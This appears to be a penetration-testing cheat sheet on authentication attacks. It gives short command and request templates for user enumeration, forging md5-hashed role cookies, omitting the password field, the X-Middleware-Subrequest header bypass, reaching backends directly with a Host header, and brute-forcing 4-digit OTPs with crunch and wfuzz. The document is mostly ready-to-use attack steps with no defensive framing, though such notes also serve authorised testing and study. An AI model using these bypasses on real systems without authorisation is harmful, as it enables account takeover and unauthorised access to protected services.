# Authentication

User enumeration — compare responses between valid and invalid accounts on any auth-adjacent endpoint (login, forgot-password, registration):

```bash
# look for a differing error string, status code, or timing between:
POST /forgot-password  {"email": "<known-valid>"}
POST /forgot-password  {"email": "<random-invalid>"}
```

Forgeable session/role cookie — if a cookie is just a hash of a predictable plaintext (not a signed/opaque server-side session ID), recompute it:

```bash
# e.g. cookie = md5("false") when logged out/low-priv
echo -n "true" | md5sum
# set cookie to the resulting hash
```

Missing-parameter bypass — delete the password field from a login request entirely rather than guessing one; some backends treat an absent field as "no check" rather than "fail":
```bash
# normal: {"username":"admin","password":"x"}
# try:    {"username":"admin"}
```

Trusted-internal-header bypass — some apps/frameworks treat a specific header as proof of internal routing (e.g. a reverse-proxy or middleware marker) and skip auth entirely when it's present. Worth trying blind on any app with a known framework fingerprint:
```bash
curl -H "X-Middleware-Subrequest: middleware" <protected-route>
```

Frontend-only access control — if a reverse proxy/CORS layer restricts access but the backend behind it is directly reachable (internal IP, different port), hit the backend directly with the `Host` header it expects instead of going through the frontend's checks:
```bash
curl -H "Host: <internal-backend-hostname>" http://<backend-ip>:<port>/<protected-endpoint>
```

Weak numeric 2FA/OTP — a short code (4 digits = 10,000 combos) with no rate limit is fully brute-forceable:
```bash
crunch 4 4 0123456789 -o 4-digits.txt
wfuzz -w 4-digits.txt -d "otp=FUZZ" -b "<session-cookie>" <target-2fa-endpoint> --hl <wrong-code-response-size>
```
